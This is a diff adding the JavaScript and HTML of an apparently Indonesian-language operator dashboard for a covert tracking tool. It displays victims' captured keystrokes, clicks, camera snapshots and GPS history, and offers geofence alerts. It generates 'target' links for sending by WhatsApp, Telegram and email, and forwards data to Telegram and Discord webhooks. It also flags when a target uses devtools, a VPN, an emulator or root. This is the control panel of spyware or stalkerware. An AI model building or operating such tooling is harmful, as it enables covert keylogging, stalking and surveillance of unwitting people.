+                ksEl.textContent = d.keystrokes.slice(-50).map(k => k.k).join('');
+            } else { ksEl.textContent = 'Belum ada data'; }
+
+            // Clicks
+            const clEl = document.getElementById('dClicks');
+            if (d.clicks && d.clicks.length) {
+                clEl.textContent = d.clicks.slice(-20).map(c => `[${c.x},${c.y}${c.el?' → '+c.el:''}]`).join('\n');
+            } else { clEl.textContent = 'Belum ada data'; }
+
+            // Snapshots
+            loadSnapshots(id);
+            // History
+            loadHistory(id);
+            // Geofence
+            document.getElementById('gfStatus').textContent = '';
+            // Switch to info tab
+            switchTab('info');
+        }
+
+        function toggleDetail() {
+            document.getElementById('detailPanel').classList.toggle('collapsed');
+        }
+
+        function closeDetail() {
+            selectedId = null;
+            document.getElementById('detailPanel').classList.add('collapsed');
+            renderDevices();
+        }
+
+        function filterDevices() { renderDevices(); }
+
+        // === TABS ===
+        function switchTab(tab) {
+            currentTab = tab;
+            document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t.dataset.tab===tab));
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.toggle('active', t.id==='tab-'+tab));
+        }
+
+        // === SNAPSHOTS ===
+        function loadSnapshots(id) {
+            const g = document.getElementById('snapGrid');
+            g.innerHTML = '<span style="color:var(--text3);font-size:0.82rem;">Memuat...</span>';
+            const d = devices[id];
+            if (!d || !d.snapshotsCount) { g.innerHTML='<span style="color:var(--text3);font-size:0.82rem;">Belum ada snapshot</span>'; document.getElementById('snapCount').textContent='0 snapshot'; return; }
+            fetch(SERVER_URL + '/api/snapshots/'+id).then(r=>r.json()).then(snaps => {
+                document.getElementById('snapCount').textContent = snaps.length+' snapshot';
+                g.innerHTML = snaps.map(s => `<img src="/snapshots/${s.filename}" onclick="window.open('/snapshots/${s.filename}','_blank')">`).join('');
+            }).catch(()=>{ g.innerHTML='<span style="color:var(--text3);font-size:0.82rem;">Gagal</span>'; });
+        }
+
+        // === HISTORY ===
+        function loadHistory(id) {
+            const d = devices[id];
+            if (!d) return;
+            let h = d.history || [];
+            if (d.location) {
+                h = [...h, d.location];
+            }
+            const seen = new Set();
+            h = h.filter(p => {
+                const k = p.lat.toFixed(5)+p.lng.toFixed(5);
+                if (seen.has(k)) return false;
+                seen.add(k);
+                return true;
+            });
+            histPoints = h;
+            drawHistory(h);
+        }
+
+        function drawHistory(points) {
+            const canvas = document.getElementById('historyCanvas');
+            const ctx = canvas.getContext('2d');
+            const rect = canvas.parentElement.getBoundingClientRect();
+            canvas.width = rect.width - 4 || 600;
+            canvas.height = 60;
+            const w = canvas.width, h = canvas.height;
+
+            ctx.clearRect(0,0,w,h);
+            if (points.length < 2) {
+                ctx.fillStyle = 'var(--text3)';
+                ctx.font = '12px sans-serif';
+                ctx.textAlign = 'center';
+                ctx.fillText('Belum ada data history', w/2, h/2+4);
+                return;
+            }
+
+            // Get theme colors
+            const style = getComputedStyle(document.body);
+            const accent = style.getPropertyValue('--accent').trim() || '#00d4ff';
+            const text3 = style.getPropertyValue('--text3').trim() || '#888';
+
+            const lats = points.map(p=>p.lat);
+            const lngs = points.map(p=>p.lng);
+            const minLat = Math.min(...lats), maxLat = Math.max(...lats);
+            const minLng = Math.min(...lngs), maxLng = Math.max(...lngs);
+            const pad = 0.02;
+            const latRange = maxLat - minLat + pad*2 || 0.001;
+            const lngRange = maxLng - minLng + pad*2 || 0.001;
+
+            // Grid lines
+            ctx.strokeStyle = text3 + '20';
+            ctx.lineWidth = 0.5;
+            for (let i=0; i<=4; i++) {
+                const y = h * (1 - i/4);
+                ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(w,y); ctx.stroke();
+            }
+
+            // Path line
+            ctx.beginPath();
+            ctx.strokeStyle = accent;
+            ctx.lineWidth = 2;
+            ctx.lineJoin = 'round';
+            for (let i=0; i<points.length; i++) {
+                const x = (points[i].lng - minLng + pad) / lngRange * w;
+                const y = h - (points[i].lat - minLat + pad) / latRange * h;
+                i===0 ? ctx.moveTo(x,y) : ctx.lineTo(x,y);
+            }
+            ctx.stroke();
+
+            // Dots
+            for (let i=0; i<points.length; i++) {
+                const x = (points[i].lng - minLng + pad) / lngRange * w;
+                const y = h - (points[i].lat - minLat + pad) / latRange * h;
+                ctx.beginPath();
+                ctx.fillStyle = i === points.length-1 ? accent : accent + '66';
+                ctx.arc(x, y, i === points.length-1 ? 4 : 2, 0, Math.PI*2);
+                ctx.fill();
+            }
+
+            // Start/end labels
+            ctx.fillStyle = text3;
+            ctx.font = '9px sans-serif';
+            ctx.fillText('Start', 4, h-4);
+            ctx.textAlign = 'right';
+            ctx.fillText('Now', w-4, h-4);
+
+            // Click handler
+            canvas.onclick = (e) => {
+                const r = canvas.getBoundingClientRect();
+                const mx = e.clientX - r.left;
+                const idx = Math.round((mx / w) * (points.length-1));
+                const p = points[Math.min(idx, points.length-1)];
+                if (p) {
+                    map.setView([p.lat, p.lng], 17);
+                    showToast(`Posisi: ${p.lat.toFixed(6)}, ${p.lng.toFixed(6)}`, 'info');
+                }
+            };
+        }
+
+        function showAllHistory() { document.querySelectorAll('.history-bar button').forEach(b=>b.classList.remove('active')); document.getElementById('hAll').classList.add('active'); drawHistory(histPoints); }
+        function showHistory(range) {
+            document.querySelectorAll('.history-bar button').forEach(b=>b.classList.remove('active'));
+            const btn = document.getElementById('h'+range);
+            if (btn) btn.classList.add('active');
+            const now = Date.now();
+            const ms = range.endsWith('m') ? parseInt(range)*60000 : parseInt(range)*60000;
+            const filtered = histPoints.filter(p => (p.timestamp||now) > now - ms);
+            drawHistory(filtered.length>1 ? filtered : histPoints);
+        }
+
+        function clearHistory() {
+            const id = selectedId;
+            if (!id) return;
+            fetch(SERVER_URL + '/api/clear-history/'+id, {method:'POST'}).then(() => {
+                if (devices[id]) devices[id].history = [];
+                histPoints = [];
+                drawHistory([]);
+                showToast('History dihapus', 'info');
+            });
+        }
+
+        // === GEOFENCE ===
+        function setGeofence() {
+            gfCenter = [parseFloat(document.getElementById('gfLat').value) || -6.2088, parseFloat(document.getElementById('gfLng').value) || 106.8456];
+            gfRadius = parseFloat(document.getElementById('gfRadius').value) || 500;
+            document.getElementById('gfStatus').textContent = `Area: ${gfCenter[0].toFixed(4)}, ${gfCenter[1].toFixed(4)} (${gfRadius}m)`;
+
+            const d = devices[selectedId];
+            if (d && d.location) {
+                const dist = map.distance([d.location.lat, d.location.lng], gfCenter);
+                const status = dist <= gfRadius ? '<span style="color:#00c853;">Dalam area</span>' : `<span style="color:#ff4444;">Luar area (${dist.toFixed(0)}m)</span>`;
+                document.getElementById('gfStatus').innerHTML += ` &middot; Device: ${status}`;
+                if (dist > gfRadius) {
+                    showToast(`Device keluar area! Jarak: ${dist.toFixed(0)}m`, 'warn');
+                }
+            }
+        }
+
+        // === COPY ===
+        function copyCoords() {
+            const lat = document.getElementById('dLat').textContent;
+            const lng = document.getElementById('dLng').textContent;
+            if (lat==='-'||lng==='-') return;
+            navigator.clipboard.writeText(`${lat}, ${lng}`).then(()=>showToast('Disalin: '+lat+', '+lng, 'success')).catch(()=>showToast('Gagal', 'info'));
+        }
+
+        // === EXPORT ===
+        function exportCSV() { window.open('/api/export/csv'); }
+        function exportJSON() { window.open('/api/export/json'); }
+        function exportDeviceCSV() { if(selectedId) window.open('/api/export/csv'); }
+        function exportDeviceJSON() { if(selectedId) window.open('/api/export/json'); }
+        function exportSnapshots() { if(selectedId) window.open('/api/export/snapshots/'+selectedId); }
+
+        // === SOCKET EVENTS ===
+        socket.on('device-update', (data) => {
+            if (!devices[data.id]) devices[data.id] = { id: data.id, label: data.label, online: true };
+            const d = devices[data.id];
+            d.location = data.location;
+            d.snapshotsCount = data.snapshotsCount||0;
+            d.online = true;
+            d.lastSeen = Date.now();
+            if (data.battery) d.battery = data.battery;
+            if (data.connection) d.connection = data.connection;
+            if (data.history) d.history = data.history;
+            if (data.visibility) d.visibility = data.visibility;
+
+            if (data.location) {
+                const loc = data.location;
+                if (markers[data.id]) {
+                    markers[data.id].setLatLng([loc.lat, loc.lng]);
+                } else {
+                    const m = L.marker([loc.lat, loc.lng], {
+                        icon: L.divIcon({ className:'', html:`<div style="background:var(--accent,#00d4ff);color:#0f0f23;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:600;white-space:nowrap;">${d.label}</div>`, iconSize:[0,0], iconAnchor:[0,0] })
+                    }).addTo(map);
+                    m.bindPopup(`<b>${d.label}</b><br>${loc.lat.toFixed(6)}, ${loc.lng.toFixed(6)}<br><a href="https://www.google.com/maps?q=${loc.lat},${loc.lng}" target="_blank" style="color:#00d4ff;">GMaps</a>`);
+                    markers[data.id] = m;
+                }
+            }
+
+            renderDevices(); updateStats();
+            if (selectedId === data.id) { selectDevice(data.id); if (currentTab==='history') loadHistory(data.id); }
+        });
+
+        socket.on('new-snapshot', (data) => {
+            if (devices[data.deviceId]) {
+                devices[data.deviceId].snapshotsCount = (devices[data.deviceId].snapshotsCount||0)+1;
+                renderDevices();
+                if (selectedId === data.deviceId) loadSnapshots(data.deviceId);
+            }
+            showToast(`Snapshot: ${data.label}`, 'info');
+        });
+
+        socket.on('device-offline', (id) => {
+            if (devices[id]) {
+                devices[id].online = false;
+                renderDevices(); updateStats();
+                if (selectedId === id) selectDevice(id);
+            }
+        });
+
+        // === AI PROFILE ===
+        function loadProfile() {
+            const id = selectedId;
+            if (!id) return;
+            const el = document.getElementById('profileContent');
+            const riskEl = document.getElementById('profileRisk');
+            const devEl = document.getElementById('profileDevice');
+            el.textContent = 'Memuat...';
+            fetch(SERVER_URL + '/api/profile/'+id).then(r=>r.json()).then(p => {
+                if (!p || p.error) { el.textContent = 'Gagal memuat profile'; return; }
+                el.textContent = '• ' + p.profile;
+                riskEl.textContent = p.riskLevel + ' Risk';
+                const colors = { HIGH: '#ff4444', MEDIUM: '#ff9800', LOW: '#00c853' };
+                riskEl.style.background = colors[p.riskLevel] || '#888';
+                riskEl.style.color = '#fff';
+                devEl.textContent = p.deviceType + ' · ' + p.os + ' · ' + p.browser;
+            }).catch(() => { el.textContent = 'Gagal'; });
+        }
+
+        // === AUTO-TARGET ===
+        function loadTargetLinks() {
+            fetch(SERVER_URL + '/api/target/link').then(r=>r.json()).then(d => {
+                document.getElementById('targetLink').textContent = d.trackingLink;
+                document.getElementById('targetWA').href = d.whatsapp;
+                document.getElementById('targetTG').href = d.telegram;
+                document.getElementById('targetEmail').href = d.email;
+            }).catch(() => {});
+        }
+
+        function copyTargetLink() {
+            const link = document.getElementById('targetLink').textContent;
+            navigator.clipboard.writeText(link).then(() => showToast('Link disalin!', 'success')).catch(() => showToast('Gagal', 'info'));
+        }
+
+        // === WEBHOOK ===
+        function loadWebhooks() {
+            fetch(SERVER_URL + '/api/webhook').then(r=>r.json()).then(d => {
+                const tg = d.telegram || [];
+                const dc = d.discord || [];
+                document.getElementById('webhookStatus').innerHTML =
+                    'Telegram: ' + tg.length + ' webhook' + (tg.length ? ' <span style="color:var(--accent);">&#10003;</span>' : '') +
+                    ' &middot; Discord: ' + dc.length + ' webhook' + (dc.length ? ' <span style="color:var(--accent);">&#10003;</span>' : '');
+            }).catch(() => {});
+        }
+
+        function addWebhook(type) {
+            const input = document.getElementById(type === 'telegram' ? 'webhookTG' : 'webhookDC');
+            const url = input.value.trim();
+            if (!url) { showToast('Masukkan URL webhook', 'info'); return; }
+            fetch(SERVER_URL + '/api/webhook', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({type, url}) })
+                .then(r=>r.json()).then(d => {
+                    if (d.ok) { showToast('Webhook '+type+' ditambahkan!', 'success'); loadWebhooks(); input.value = ''; }
+                    else showToast('Gagal: '+d.error, 'info');
+                }).catch(() => showToast('Gagal', 'info'));
+        }
+
+        // === FORENSICS ===
+        function loadForensics() {
+            const id = selectedId;
+            const el = document.getElementById('forensicsList');
+            if (!id) { el.innerHTML = '<div style="color:var(--text3);font-size:0.8rem;text-align:center;padding:20px;">Pilih device</div>'; return; }
+            fetch(SERVER_URL + '/api/alerts/'+id).then(r=>r.json()).then(alerts => {
+                if (!alerts || !alerts.length) {
+                    el.innerHTML = '<div style="color:var(--text3);font-size:0.8rem;text-align:center;padding:20px;">Belum ada alert forensics</div>';
+                    return;
+                }
+                el.innerHTML = alerts.slice().reverse().map(a => {
+                    const icons = { devtools: '🔧', vpn: '🌐', emulator: '📱', root: '🔓' };
+                    const colors = { devtools: '#ff9800', vpn: '#00bcd4', emulator: '#e91e63', root: '#ff4444' };
+                    return `<div style="padding:8px 10px;border-radius:6px;background:var(--bg);margin-bottom:4px;border-left:3px solid ${colors[a.type]||'#888'}">
+                        <span style="font-size:1rem;">${icons[a.type]||'⚠️'}</span>
+                        <strong style="font-size:0.8rem;text-transform:capitalize;">${a.type}</strong>
+                        <span style="color:var(--text3);font-size:0.72rem;margin-left:6px;">${new Date(a.time).toLocaleTimeString()}</span>
+                        <div style="font-size:0.75rem;color:var(--text2);margin-top:3px;">${a.detail}</div>
+                    </div>`;
+                }).join('');
+            }).catch(() => { el.innerHTML = '<div style="color:var(--text3);text-align:center;padding:20px;">Gagal</div>'; });
+        }
+
+        socket.on('forensics-alert', (data) => {
+            if (data.deviceId === selectedId) loadForensics();
+            showToast(`Forensics: ${data.type} - ${data.label}`, 'warn');
+        });
+
+        // Patch selectDevice to also load profile, forensics, targets
+        const origSelect = selectDevice;
+        selectDevice = function(id) {
+            origSelect(id);
+            setTimeout(() => {
+                loadProfile();
+                loadForensics();
+            }, 300);
+        };
+
+        // Window resize for history canvas
+        window.addEventListener('resize', () => {
+            if (histPoints.length) drawHistory(histPoints);
+        });
+
+        loadTargetLinks();
+        loadWebhooks();
+        fetchDevices();
+    </script>
+</body>
+</html>
